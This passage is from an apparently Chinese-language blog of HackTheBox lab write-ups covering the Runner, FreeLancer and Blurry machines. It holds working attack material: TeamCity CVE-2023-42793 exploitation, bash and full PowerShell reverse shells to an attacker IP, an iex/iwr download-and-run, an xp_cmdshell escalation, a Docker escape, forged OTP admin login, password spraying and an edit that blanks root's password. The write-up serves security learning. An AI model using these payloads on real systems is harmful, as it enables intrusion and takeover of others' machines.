10.10.11.5      445    DC               [-] freelancer.htb\\Administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE ILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [-] freelancer.htb\\mikasaAckerman:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE</span><br><span class=\"line\">SMB         10.10.11.5      445    DC               [+] freelancer.htb\\mikasaAckerman:IL0v3ErenY3ager</span><br></pre></td></tr></table></figure>\n\n<p>爆出来 mikasaAckerman/IL0v3ErenY3ager，然后传 <a href=\"https://github.com/antonioCoco/RunasCs\">RunasCs</a> 横向移动，执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.18:55556</span><br></pre></td></tr></table></figure>\n\n<p>把 mikasaAckerman 的 shell 弹出来，在 Desktop 下找到第一个 flag。<br>这里不知道为啥用 evil-winrm 连不上，可能是因为权限问题。</p>\n<p>system flag 涉及域渗透，一点不会。<br>桌面还有个 <code>mail.txt</code>，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hello Mikasa,</span><br><span class=\"line\">I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &quot;DATACENTER-2019&quot; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.</span><br><span class=\"line\">I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#x27;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.</span><br><span class=\"line\">Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.</span><br><span class=\"line\">Best regards,</span><br></pre></td></tr></table></figure>\n\n<p>翻译一下就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你好，米卡萨，</span><br><span class=\"line\"></span><br><span class=\"line\">我再次尝试与丽莎·卡扎诺夫合作，寻求她的帮助以解决“DATACENTER-2019”电脑上的蓝屏死机（BSOD）问题。正如你所知，这个问题在我们安装了 SQL Server 2019 的新更新后开始出现。</span><br><span class=\"line\"></span><br><span class=\"line\">我尝试了你在上封邮件中提供的解决方案，但不幸的是，没有任何改进。每当我们尝试与安装的实例建立远程 SQL 连接时，服务器的 CPU 就会开始过热，RAM 使用量不断增加，直到出现蓝屏死机，迫使服务器重启。</span><br><span class=\"line\"></span><br><span class=\"line\">然而，丽莎要求我在数据中心生成一个完整的内存转储，并将其发送给你以便进一步协助解决问题。</span><br><span class=\"line\"></span><br><span class=\"line\">此致</span><br><span class=\"line\"></span><br><span class=\"line\">最佳问候</span><br></pre></td></tr></table></figure>\n\n<p>意思就是他把内存 dump 下来了，看样子应该就是 <code>Desktop</code> 下的 <code>MEMORY.7z</code>，如何把这个文件传出来费了很大劲。</p>\n<h2 id=\"Blurry\"><a href=\"#Blurry\" class=\"headerlink\" title=\"Blurry\"></a>Blurry</h2><p>fscan 开扫</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start infoscan</span><br><span class=\"line\">10.10.11.19:80 open</span><br><span class=\"line\">10.10.11.19:22 open</span><br><span class=\"line\">[*] alive ports len is: 2</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] WebTitle http://10.10.11.19        code:301 len:169    title:301 Moved Permanently 跳转url: http://app.blurry.htb/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>Runner<br><a href=\"https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632\">https://cerb3rus.medium.com/hackthebox-runner-writeup-466ffd800632</a><br><a href=\"https://blog.csdn.net/m0_52742680/article/details/138076335\">https://blog.csdn.net/m0_52742680/article/details/138076335</a><br><a href=\"https://nitroc.org/posts/cve-2024-21626-illustrated/\">https://nitroc.org/posts/cve-2024-21626-illustrated/</a></p>\n<p>FreeLancer<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/139441094\">https://blog.csdn.net/m0_52742680/article/details/139441094</a></p>\n","excerpt":"<p>不得不找饭吃了。<br>Two Million / Mailing / BoardLight / Usage</p>","more":"<h2 id=\"Runner\"><a href=\"#Runner\" class=\"headerlink\" title=\"Runner\"></a>Runner</h2><p>扫端口，有 22，80，8000，访问 80 发现是个静态网页，dirsearch 也没扫出东西，再扫 8000，只有个 <code>/health</code> 和 <code>/version</code> 路由，也没什么用。<br>再扫子域名，也没扫出来东西，一看 wp 原来人家用的超大字典，晕</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzwfuzz -c -w  /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u <span class=\"string\">&quot;http://runner.htb&quot;</span> -H <span class=\"string\">&quot;Host:FUZZ.runner.htb&quot;</span> --hw 10</span><br></pre></td></tr></table></figure>\n\n<p>于是就扫出来 <code>teamcity.runner.htb</code>，访问，是个 TeamCity。搜一下 CVE：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ searchsploit teamcity</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\"> Exploit Title                                                                                                                                   |  Path</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                              | java/remote/47891.txt</span><br><span class=\"line\">JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                       | java/remote/51884.py</span><br><span class=\"line\">TeamCity &lt; 9.0.2 - Disabled Registration Bypass                                                                                                  | multiple/remote/46514.js</span><br><span class=\"line\">TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                          | multiple/remote/45917.rb</span><br><span class=\"line\">TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                              | php/webapps/48201.py</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class=\"line\">Shellcodes: No Results</span><br></pre></td></tr></table></figure>\n\n<p>网页写着 <code>Version 2023.05.3 (build 129390)</code>，这不正好是 CVE-2023-42793，直接 <code>searchsploit -p java/remote/51884.py</code> 找到 PoC 的位置，然后复制过来跑</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python 51884.py -u http://teamcity.runner.htb</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================</span><br><span class=\"line\">*       CVE-2023-42793                              *</span><br><span class=\"line\">*  TeamCity Admin Account Creation                  *</span><br><span class=\"line\">*                                                   *</span><br><span class=\"line\">*  Author: ByteHunter                               *</span><br><span class=\"line\">=====================================================</span><br><span class=\"line\"></span><br><span class=\"line\">Token: eyJ0eXAiOiAiVENWMiJ9.SXpoSWFONE1EaGJ3SmowbGxLMmNfSmlaZkZV.NzU0ZDU4NzYtNzU3My00ZTgwLWFmNWMtMGIyNjliZjY0ZDkw</span><br><span class=\"line\">Successfully exploited!</span><br><span class=\"line\">URL: http://teamcity.runner.htb</span><br><span class=\"line\">Username: city_adminOpx8</span><br><span class=\"line\">Password: Main_password!!**</span><br></pre></td></tr></table></figure>\n\n<p>把 Token 存到文件 <code>token</code>，然后执行这个 <a href=\"https://github.com/Zyad-Elsayed/CVE-2023-42793/blob/main/rce.py\">PoC</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python rce.py -u http://teamcity.runner.htb -t token -c <span class=\"string\">&#x27;&quot;/bin/bash&quot;&amp;params=&quot;-c&quot;&amp;params=&quot;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.18%2F55555%200%3E%261&quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后就拿到 shell 了，得到第一个 flag。注意这里是 docker 的 shell，执行 <code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 换个 shell（不知道和直接 <code>bash</code> 有啥区别），传 <code>linpeas.sh</code> 执行没找到啥，但是能搜到一个 <code>id_rsa</code>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>\n\n<p>这里 <code>2&gt; /dev/null</code> 是把 stderr 重定向到 <code>/dev/null</code>，不然会有很多权限不足的提示。<br>在网站中的 User 里有个 john，然后就可以用这个 <code>id_rsa</code> 登录 john 了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 600 id_rsa</span><br><span class=\"line\">ssh john@runner.htb -i id_rsa</span><br></pre></td></tr></table></figure>\n\n<p>一开始报 <code>Load key &quot;id_rsa&quot;: error in libcrypto</code>，原来是末尾少打一个换行。<br>再传 <code>linpeas.sh</code> 扫一轮，发现 <code>/etc/hosts</code> 里还有个域名叫 <code>portainer-administration.runner.htb</code>，加到本机里，然后访问，发现是个 Portainer，查漏洞，没有。</p>\n<p>之前的网站是有个备份的，下载下来能找到 <code>users</code>，内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM</span><br><span class=\"line\">1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717486715003, BCRYPT</span><br><span class=\"line\">2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT</span><br><span class=\"line\">11, city_adminopx8, $2a$07$K1PwHspWALRGHbsy0XaPOe7cIK2IVF5hkq8DS/t0L6ulKDCNoACY2, , angry-admin@funnybunny.org, 1717487324779, BCRYPT</span><br></pre></td></tr></table></figure>\n\n<p>用 john 把 matthew 的密码爆出来，为 <code>piper123</code>，注意 john 会把结果存在 <code>~/.john/john.pot</code> 里，再跑的话要 <code>john --show hash.txt</code> 才能显示。</p>\n<p>用这个去登录 Portainer，然后用 CVE-2024-21626 打 docker 逃逸，启动一个 container，把 working dir 挂到 <code>/proc/self/fd/8</code>，网页 shell 不好使，用 bash 弹个 shell 回来：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.16.18/55555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p>然后 <code>cat ../../../root/root.txt</code> 就拿到第二个 flag 了。<br>无聊的时候想用 john 爆 <code>/etc/shadow</code> 里 root 的密码，发现还得加 <code>--format=crypt</code>。</p>\n<h3 id=\"后继小研究\"><a href=\"#后继小研究\" class=\"headerlink\" title=\"后继小研究\"></a>后继小研究</h3><p>发现 docker 里面没有 nano 也没有 vim，但是有 sed，执行如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">&#x27;s/root:x:/root::/&#x27;</span> ../../../etc/passwd</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以 <code>su root</code> 了，执行 <code>crontab -e</code>，发现有个定时任务。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@reboot docker start kind_leavitt</span><br><span class=\"line\">@reboot /root/monitor.sh</span><br><span class=\"line\">*/5 * * * * /root/monitor.sh</span><br><span class=\"line\">*/2 * * * * /root/docker_clean.sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"浅谈-Docker-涉及的一些概念\"><a href=\"#浅谈-Docker-涉及的一些概念\" class=\"headerlink\" title=\"浅谈 Docker 涉及的一些概念\"></a>浅谈 Docker 涉及的一些概念</h3><p><strong>cgroup</strong>（Control Groups）是 Linux 内核提供的一种机制，用于限制、记录和隔离进程组（如容器）的资源使用情况（如 CPU、内存、磁盘 I/O、网络带宽等）。cgroup 可以帮助系统管理员分配系统资源，以确保每个容器或进程组都能获得足够的资源，并防止单个容器或进程组消耗过多资源而影响其他容器或进程组的正常运行。<br><strong>runC</strong> 是一个符合 Open Container Initiative (OCI) 规范的容器运行时。它是一个轻量级的运行时，负责创建和运行容器。runC 可以被认为是 Docker 的默认底层运行时之一。runC 提供了对容器的直接管理接口，Docker 利用 runC 来实际执行容器操作。<br><strong>containerd</strong> 是一个高层次的容器运行时，由 Docker Inc. 维护。containerd 提供了容器生命周期管理的高级 API，支持创建、管理和运行容器。它内部可以调用 runC 或其他 OCI 兼容的运行时来实际执行容器操作。containerd 是 Docker 的核心组件之一，负责管理容器运行时的交互。<br><strong>CRI-O</strong> 是 Kubernetes 的一个容器运行时接口（CRI）实现，专门为 Kubernetes 设计。它直接运行 OCI 容器，使用 runC 或 Kata Containers 作为底层运行时。CRI-O 提供了一个轻量级的运行时环境，专注于 Kubernetes 的需求。</p>\n<blockquote>\n<p>总结：Docker 使用 containerd 作为其核心运行时，containerd 内部则调用 runC 或其他运行时来实际管理容器，所有的容器运行时都依赖 cgroup 来实现资源隔离和管理。</p>\n</blockquote>\n<h2 id=\"FreeLancer\"><a href=\"#FreeLancer\" class=\"headerlink\" title=\"FreeLancer\"></a>FreeLancer</h2><p>fscan 开扫，疑惑了很久怎么打，原来是环境问题，80 端口我没扫到，现在应该修好了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ fscan -h 10.10.11.5 -p 1-65535</span><br><span class=\"line\"></span><br><span class=\"line\">   ___                              _</span><br><span class=\"line\">  / _ \\     ___  ___ _ __ __ _  ___| | __</span><br><span class=\"line\"> / /_\\/____/ __|/ __| <span class=\"string\">&#x27;__/ _` |/ __| |/ /</span></span><br><span class=\"line\"><span class=\"string\">/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;</span></span><br><span class=\"line\"><span class=\"string\">\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\</span></span><br><span class=\"line\"><span class=\"string\">                     fscan version: 1.8.4</span></span><br><span class=\"line\"><span class=\"string\">start infoscan</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:88 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:139 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:135 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:53 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:593 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:80 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:464 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:389 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:445 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:636 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:3269 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:3268 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:5985 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:9389 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:47001 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49667 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49669 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49665 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49671 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49670 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49664 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49675 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49672 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49666 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:49815 open</span></span><br><span class=\"line\"><span class=\"string\">10.10.11.5:55297 open</span></span><br><span class=\"line\"><span class=\"string\">[*] alive ports len is: 26</span></span><br><span class=\"line\"><span class=\"string\">start vulscan</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5         code:302 len:0      title:None 跳转url: http://freelancer.htb/</span></span><br><span class=\"line\"><span class=\"string\">[*] NetInfo</span></span><br><span class=\"line\"><span class=\"string\">[*]10.10.11.5</span></span><br><span class=\"line\"><span class=\"string\">   [-&gt;]DC</span></span><br><span class=\"line\"><span class=\"string\">   [-&gt;]10.10.11.5</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5:5985    code:404 len:315    title:Not Found</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://10.10.11.5:47001   code:404 len:315    title:Not Found</span></span><br><span class=\"line\"><span class=\"string\">[*] WebTitle http://freelancer.htb/    code:200 len:57293  title:Freelancer - Job Board &amp; Hiring platform</span></span><br><span class=\"line\"><span class=\"string\">已完成 26/26</span></span><br><span class=\"line\"><span class=\"string\">[*] 扫描结束,耗时: 1m15.097074037s</span></span><br></pre></td></tr></table></figure>\n\n<p>老样子加进 hosts，访问，是个招聘网站，用 dirsearch 一顿扫，结果里面一堆 <code>/admin</code> 路由的。<br>注册了一个 employer 的帐号，密码还不能太简单，登录说没激活，点击忘记密码，重置一次，就能登录了。<br>有个二维码登录的功能，说用手机扫就能直接登录，随便找个<a href=\"https://zxing.org/w/decode.jspx\">在线识别网站</a>识别出 <code>http://freelancer.htb/accounts/login/otp/MTAwMTA=/700a374a3c075b4da499d76a39953af6/</code></p>\n<p><code>MTAwMTA=</code> base64 解出是 <code>10010</code>，猜测是用户的 ID，后面应该是关于时间的凭据。在 Blog 里随便发表一条评论，然后自己的链接就是 <code>http://freelancer.htb/accounts/profile/visit/10010/</code> ，那么就八九不离十了，从 1 开始试，发现 <code>http://freelancer.htb/accounts/profile/visit/2/</code> 可以访问到，而且 username 是 admin，那么尝试伪造 admin 登录，2 对应 base64 即为 <code>Mg==</code>，拼接链接 <code>http://freelancer.htb/accounts/login/otp/Mg==/700a374a3c075b4da499d76a39953af6/</code> 成功登录 admin。</p>\n<p>登上之后页面和之前差不多，直接进 <code>/admin</code> 路由，到了管理页面。一眼看到 SQL Terminal，GPT 说可以用 xp_cmdshell 执行命令，发现没权限</p>\n<p>执行如下命令：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> name <span class=\"keyword\">AS</span> DatabaseName, suser_sname(owner_sid) <span class=\"keyword\">AS</span> Owner</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> sys.databases;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到 Owner 全部是 sa，然后模拟 sa 登录，执行如下命令启用 xp_cmdshell：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXECUTE</span> <span class=\"keyword\">AS</span> LOGIN <span class=\"operator\">=</span> <span class=\"string\">&#x27;sa&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;</span><br><span class=\"line\">RECONFIGURE;</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;</span><br><span class=\"line\">RECONFIGURE;</span><br></pre></td></tr></table></figure>\n\n<p>再</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXEC</span> xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>发现命令执行成功。<br>想弹个 shell，搞着搞着发现 bash 不了，才想起来这是 Windows</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXECUTE</span> xp_cmdshell <span class=\"string\">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.18/1.ps1)&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>发现弹了一下就断了，应该是被杀软掐了。<br>试了很多个都不行，没办法了，用大哥找到的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do &#123;</span><br><span class=\"line\">    # Delay before establishing network connection, and between retries</span><br><span class=\"line\">    Start-Sleep -Seconds 1</span><br><span class=\"line\"></span><br><span class=\"line\">    # Connect to C2</span><br><span class=\"line\">    try&#123;</span><br><span class=\"line\">        $TCPClient = New-Object Net.Sockets.TCPClient(&#x27;10.10.16.18&#x27;,55555)</span><br><span class=\"line\">    &#125; catch &#123;&#125;</span><br><span class=\"line\">&#125; until ($TCPClient.Connected)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">NetworkStream = <span class=\"variable\">$TCPClient</span>.GetStream()</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">StreamWriter = New-Object IO.StreamWriter(<span class=\"variable\">$NetworkStream</span>)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Writes a string to C2</span></span><br><span class=\"line\">function WriteToStream ($String) &#123;</span><br><span class=\"line\">    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span><br><span class=\"line\">    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % &#123;0&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Write to C2</span><br><span class=\"line\">    $StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;)</span><br><span class=\"line\">    $StreamWriter.Flush()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Initial output to C2. The <span class=\"keyword\">function</span> also creates the inital empty byte array buffer used below.</span></span><br><span class=\"line\">WriteToStream &#x27;&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Loop that breaks <span class=\"keyword\">if</span> NetworkStream.Read throws an exception - will happen <span class=\"keyword\">if</span> connection is closed.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">while(($</span><span class=\"language-bash\">BytesRead = <span class=\"variable\">$NetworkStream</span>.Read(<span class=\"variable\">$Buffer</span>, 0, <span class=\"variable\">$Buffer</span>.Length)) -gt 0) &#123;</span></span><br><span class=\"line\">    # Encode command, remove last byte/newline</span><br><span class=\"line\">    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)</span><br><span class=\"line\">    </span><br><span class=\"line\">    # Execute command and save output (including errors thrown)</span><br><span class=\"line\">    $Output = try &#123;</span><br><span class=\"line\">            Invoke-Expression $Command 2&gt;&amp;1 | Out-String</span><br><span class=\"line\">        &#125; catch &#123;</span><br><span class=\"line\">            $_ | Out-String</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Write output to C2</span><br><span class=\"line\">    WriteToStream ($Output)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Closes the StreamWriter and the underlying TCPClient</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">StreamWriter.Close()</span></span><br></pre></td></tr></table></figure>\n\n<p>看到用户文件夹下的 <code>Download</code> 有个 <code>SQLEXPR-2019_x64_ENU</code> 目录，进去发现 <code>sql-Configuration.INI</code>，内容如下：</p>\n<figure class=\"highlight ini\"><table><tr><td 